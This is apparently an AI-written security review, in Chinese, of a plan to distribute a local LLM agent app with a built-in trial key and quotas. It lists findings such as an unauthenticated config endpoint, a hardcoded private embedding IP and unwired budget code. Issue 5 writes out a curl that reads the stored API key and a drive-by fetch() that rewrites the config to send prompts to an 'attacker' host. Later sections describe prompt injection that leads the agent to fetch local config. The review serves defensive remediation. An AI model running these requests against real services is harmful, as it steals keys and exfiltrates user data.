评审完成。以下为安全评审意见（证据来自本机代码库实测；服务未运行 → 涉及"实测响应"的条目已标注判定方式）。

═══════════════════════════════════════
secguard · §6 P0「内置体验 key + 限额」安全评审
═══════════════════════════════════════

【问题 1】内置 key 必然可提取 —— 打包形态决定了这一点
→ 证据：scripts/lingShu_installer.iss:50 是整目录复制（`Source: "..\dist\lingShu\*"; recursesubdirs`）；实测 `ls dist/lingShu/` = `_internal / lingShu.exe / logs / webview_data`，`_internal` 是普通文件夹。当前构建产物**干净**（`find dist -iname '.env*'` 空；.env 在 .gitignore:10 且 `git log --all -- .env` 从未提交），但正因如此：方案 a 一旦把体验 key 放进 DATA_FILES/.env/config.json，它就是随包分发的明文，解压即得（.pyc 亦可反编译）。另外 config.py:16-32 会从自身路径向上 6 层找 .env 并载入 —— 在开发机上会把仓库根 .env 吸进进程，这个上行查找逻辑本身就容易被"顺手放个 .env 到安装目录"利用。
→ 级别 P0
→ 建议：不要分发你的云端 key。改为「每人一把独立 key（可单独吊销）」或「key 只指向自建限额代理，不能直连 DeepSeek」。若必须内置，只放受限令牌 + 代理侧硬配额。

【问题 2】"限额"在代码里没有执行原语 —— 这条最硬
→ 证据：`BudgetExceeded` 全仓只在 core/budget.py:25 定义，无一处抛出、无一处捕获；`from ...budget import` 零命中；全仓唯一运行时提到 budget 的是 graph_multi.py:54 的注释。真实存在的只有 apps/research/api.py:58-77 `_check_rate_limit`：进程内内存、按 client_ip、默认 100 次/60s、`HARNESS_DISABLE_RATE_LIMIT` 可关。本地部署所有请求都来自 127.0.0.1 → 整机共用一个桶；重启进程即清零；无每日/每 key 配额。单任务上限 MAX_TOKENS_PER_TASK=100000...59）。
→ 攻击路径：拿到内置 key → 循环 POST /v1/chat/completions → 每分钟 100 次 × 每次 10 万 token 上限，成本曲线没有任何代码截断。
→ 级别 P0
→ 建议：限额必须是**服务端属性**（代理侧按 key 每日 token/请求硬上限，超限 429/403），客户端限额等于没有限额；同时把 budget 真正接线（超限 raise → finalize），并把单任务 token 上限从 10 万降到几千量级。

【问题 3】体验 key 在每台机器上就是 admin —— owner_id 隔离被一刀绕过
→ 证据：main.py:142-149 校验通过后固定注入 `{"id":"__api_key__","role":"admin"}`；api.py:626-628 与 647-649 用 `is_admin` 决定 `owner_filter = None if is_admin else user.id` —— admin 无过滤，可读全部报告/会话/知识库；/v1/admin/*（用户 CRUD）、/v1/setup/*、/v1/safety/mode、/v1/tools 开关均落在 admin 之下。
→ 影响边界（必须先说清，避免夸大）：灵枢单机部署、各机器 DB 独立，所以这是**同一台机器上的多用户越权**，不是打穿别人机器。但只要一个用户建了第二个账号或与家人共用一台机，key 就让他看见别人的全部数据 —— 而 AGENTS.md:59 把"owner_id 会话隔离"当卖点，面试官恰好会问"D4 隔离强度够不够"。
→ 级别 P1
→ 建议：体验 key 降权为受限角色，只放行 chat/session/knowledge 最小集，禁 /v1/admin、/v1/setup、/v1/safety、/v1/tools 写；或每人一个 user 账号走 JWT，key 只留给你自己。

【问题 4】key 可从 URL 泄漏（有明确代码位置）
→ 证据：main.py:142 `api_key = request.headers.get("x-api-key","") or request.query_params.get("api_token","")` —— 允许 `?api_token=<key>`。query 会进 uvicorn access log、浏览器历史、Referer、代理/杀软日志。而非技术用户指引最容易写成"打开 http://127.0.0.1:8788/?api_token=xxx"。
→ 级别 P1
→ 建议：删掉 query 旁路，只认 header；文档严禁把 token 写进 URL。

【问题 5】存在无认证的配置读写端点 —— 与"内置 key"方案正面冲突
→ 证据：api.py:89-92 `_AUTH_EXEMPT_V1` 含 `"/v1/setup/config"`；main.py:129-130 精确匹配放行；api.py:512-520 的 GET/POST 直接落到 config_manager.load_config/save_config；config_manager.py:22-29 的 config.json 里有 `llm.api_key` 字段，load_config（52-65 行）**原样返回**。
→ 攻击路径 A（key 提取最短路径，无需逆向 exe）：本机任意进程或另一个 Windows 账户 `curl http://127.0.0.1:8788/v1/setup/config` 即读到 config.json 全量含 key。判定方式：认证豁免与返回体 ✅ 代码级确定；服务未运行故未取到实测响应（curl 返回 000）。
→ 攻击路径 B（drive-by 写，⚠️ 代码级判定、未实弹验证）：恶意网页 `fetch('http://127.0.0.1:8788/v1/setup/config',{method:'POST',body:JSON.stringify({llm:{api_url:'http://attacker/v1'}})})` —— 默认 Content-Type 为 text/plain 属"简单请求"，不触发预检，CORS 只拦响应不拦请求；Starlette 的 `await request.json()` 不校验 Content-Type 照样解析 → 配置被改写 → 此后用户每条 prompt（含知识库内容）发往攻击者服务器。这是 localhost 服务 CSRF 的标准形态，未做活体验证（未启动服务、且写入会改动真实配置，我在评审中不做破坏性验证）。
→ 级别 P0
→ 建议：把 /v1/setup/config 移出豁免名单（首启引导改用 setup-admin 后的 JWT）；GET 必须脱敏（`has_key: true` 或 `sk-****`）；POST 对 api_url 做协议+域名白名单；加 Origin/Host 校验，非 GET 且 Origin 非本机的一律拒绝。

【问题 6】日志与"截图/导出日志"验收方式的组合泄漏
→ 证据：(a) main.py:290 `print(f"  Token: {_API_TOKEN[:8]}...{_API_TOKEN[-4:]}")` 启动横幅印出 12 字符，而 §1 的 P0 验收正是"微信记录/截图" → 截图即泄一半 key。(b) core/agent_log.py:15-30 把每次运行的搜索词等写入 `~/.agent-harness/agent_logs/{session_id}.jsonl`（明文无脱敏）；api_security.py:86-103 的 audit 也落盘。(c) 反面：主访问日志只记 method/path/status（main.py:81-82），不含 header/body，这点做对了。
→ 级别：(a) P2，(b) P1（§6 P1 的"导出日志按钮"落地前必须先脱敏，否则等于把用户搜索词/可能含 key 的日志发到微信）
→ 建议：横幅只印后 4 位；导出日志前跑脱敏（抹 sk-/Authorization/token 形态）；指引里写明"日志含你的搜索词，可先自行查看再发我"。

━━━ Q2：把 exe 发给 3–5 个熟人（§5 D 类）━━━

【问题 7】最严重：RAG 默认把用户文档原文 POST 到硬编码内网 IP
→ 证据：core/tools/rag_store.py:37-40 `OLLAMA_API = os.environ.get("HARNESS_OLLAMA_API", "http://172.18.9.126:11434/api/embed")`；`_embed()` 在 179-183 行把**未缓存的分块原文** `json={"model":…,"input": uncached_texts}` POST 至该地址，170 行还先 GET 探活。scripts/lingShu_launcher.py:80 只设 HARNESS_API_PORT，安装包不分发 .env（dist 内 find 无 .env）→ 熟人机器上必然走这个默认值。同一 IP 另硬编码 6 处：auto_setup.py:25、config_manager.py:166/168/345/355（后端探测 + `wsl ... nohup ollama serve`）、scripts/boss_reply_server.py:35。
→ 后果三条：(i) 172.16.0.0/12 是私网段，家庭/公司局域网里该地址可能是**别人的机器**（路由器 DHCP 池 / 同事电脑）→ 用户上传的论文、合同、公司资料原文出境到第三方主机；(ii) 若该地址不存在 → `_embed` 静默返回全零向量（172-174 行）→ 向量检索无声退化为 BM25，用户只会觉得"知识库不准"；(iii) 顺带把开发机内网拓扑发给每个熟人。D1/D2/D4 在这一条上全覆盖，且它是"数据不出本机"卖点的**反面证据**。
→ 级别 P0
→ 建议：三处统一改 127.0.0.1:11434；嵌入失败必须显式提示"本地嵌入不可用，已降级关键词检索"，禁止静默全零；把"全仓 grep 私网 IP"做成发版 CI 门禁。

【问题 8】"发 exe"这个动作本身 = 把一个能在别人机器上起子进程的本地服务交出去
→ 证据：安装器整目录复制（lingShu_installer.iss:50）；POST /v1/setup/fix（api.py:548-552）→ config_manager.fix_action → config_manager.py:343-361 `subprocess.run(["wsl","-d","Ubuntu-22.04","bash","-lc","nohup ollama serve …"])`。该接口需认证，但配合问题 3（key=admin）等价于"持有 key 即可在对方机器上触发子进程/容器启动"。
→ 级别 P1（管理面/信任面）
→ 建议：固定交付流程（只从你微信原件接收 + 附 SHA256 校验）；/v1/setup/fix 收紧 action 白名单并加二次确认；明确写下"我不会要求你发 token 或设置页截图"。

【问题 9】同机多用户/共用设备的数据边界与"删除权"
→ 证据：数据全落用户本机明文 —— SQLite auth.db、`~/.agent-harness/agent_logs/*.jsonl`、rag_data/、reports MD+HTML（AGENTS.md:129-131）；会话有原子写入但无加密。删除能力只零散存在（如 api.py:669 报告删除），缺"一键清空我的数据"和"卸载是否残留"的说明，而 §5 D3 明确列了这一项。
→ 级别 P1
→ 建议：补"导出/一键删除我的数据"入口；安装与卸载明示数据目录（`C:\Users\<用户>\.agent-harness`，卸载不清理）。

【问题 10】首启抢注竞态
→ 证据：api.py:1101-1104 setup-admin 有 `needs_initial_admin()` 守卫（做对了），但该端点无认证，只要"尚无管理员"就放行。
→ 风险：装完还没建账号的窗口期，本机任意进程（或简单请求）可先建 admin 占位。低概率，但场景恰好是"无人陪同"。
→ 级别 P2
→ 建议：首建完成后自动禁用该端点，或改为桌面窗口内一次性引导。

【问题 11】已核实做对的部分（先说明，避免误判为全盘否定）
→ 证据：报告路径参数有 `_safe_path_param`（api.py:644）；非 owner 与不存在同回 404 不泄露存在性（api.py:650-652）；令牌比较用 `hmac.compare_digest`（api_security.py:47-51）；CORS 白名单限于本机 origin（main.py:90-94）；安全头含 CSP / X-Frame-Options / nosniff（main.py:161-179）；健康检查刻意抹掉内网 IP（health.py:40）；.env 被 gitignore 且**从未进入 git 历史**，HEAD 与全历史 grep 无 sk-/ghp_/AKIA 真实 key 形态（实测 `git log --all -p | grep '^+.*sk-[A-Za-z0-9]{20,}'` 零命中）→ AGENTS.md:226 提到的"API Key 泄露修复"没有在仓库里遗留活 key。SSRF 方面：抓取工具**没有**私网地址拦截（全仓 grep `is_private|ipaddress|内网拦截` 零命中），LLM 被 prompt 注入后可被诱导抓 http://127.0.0.1:8788/v1/setup/config 或内网段 —— 与问题 5 形成组合拳。
→ 级别：无（记录用）
→ 建议：这些是面试好料（安全三层 + v0.75.2 fail-closed），但**必须先把问题 4/5/7 修掉再讲**，否则一句"那别人拿到你的 exe 呢"就会把这套叙事推翻。

━━━ Q3：B2 本地模型兜底，隐私风险真的下降吗 ━━━

判断：只降一半，且当前实现下这句话（"数据不出本机"）不成立。
→ 降的一半是真的 ✅（代码级确认）：core/pipeline/llm.py:168-190，云端不可达 → 降级到本地 `call_llama`；而本地调用失败是自己返回空（llm.py:126-127），**没有 local→cloud 的静默上行**。即选本地模型不会偷偷把 prompt 发云端，这个方向是对的。
→ 但三条旁路把"不出本机"打破：
  (a) 用户文档原文 → 172.18.9.126（问题 7），且不需要任何云端 key 就已发生；
  (b) 搜索链 SearXNG→DuckDuckGo 必然出公网（AGENTS.md:37），agent 会把用户问题/知识库片段转成搜索词 → 内容以查询词形式出境，论文/资料问答场景尤其明显；
  (c) 网页抓取（fetch/web_scrape/agent_browser 三级，AGENTS.md:38）把 URL 发出，若 URL 由 LLM 依用户材料生成，等于经域名把内容带出；且无私网拦截 → prompt 注入 ≈ 内网探测/本地配置读取（与问题 5 叠加）。嵌入走 Ollama 本身是本地（rag_store.py:37 的设计意图正确），只是默认地址写错了。
→ 结论：B2 的隐私收益 = 少掉"prompt 上云"这一段，仍保留"文档上内网 IP + 查询词上公网 + URL 抓取"三段。要让"本地优先、数据不出本机"站得住，需 B2 + 修问题 7 + 该场景关搜索/抓取；否则措辞必须降级为"LLM 推理可在本地，检索与嵌入仍走网络"——面试官追问"那上传的论文经过哪些机器"时，这句话决定你是坦率还是被抓。另：B2 的可用性同样未验证（U3，1.7b 质量），而 §1 P0 是"独立完成首次任务"，本地模型答不出即等于失败。

═══════════════════════════════════════
总裁决：【该改】—— 方向（找 3–5 个真实用户）该做，但 §6 P0 这个具体方案不能按现状发：限额在代码里没有执行原语（budget 未接线）、key 一旦内置必被明文提取、包里还带着把用户文档发往内网 IP 的默认路径（rag_store.py:39）。

发之前先做四件小改，全部可当天完成：
1) 删掉 /v1/setup/config 的认证豁免 + 返回体脱敏 api_key（api.py:89-92、config_manager.py:52-65）
2) 体验 key 降权为受限角色，配额放服务端；URL query 传 token 的旁路一并删除（main.py:142）
3) 三处私网 IP（rag_store.py:39 / auto_setup.py:25 / config_manager.py:166,168,345,355）改 127.0.0.1，嵌入失败改为显式提示
4) 真接线 budget + 单任务 token 上限从 10 万降到几千

对外暴露面判断：**本次改动显著新增风险**。它把「一个持有共享 admin key、且存在无认证配置读写端点的本机 HTTP 服务」推向 3–5 台不受控机器，而当前代码的限流只是进程内按 IP 的软桶、budget 未接线、且包内默认会把用户文档发往一个私网 IP。上述四条修完，新增风险可压回"可接受的低危"；不修直接发，则是把成本敞口和用户数据两头都交出去，且任何一个熟人的截图/日志都会成为面试场上的反例。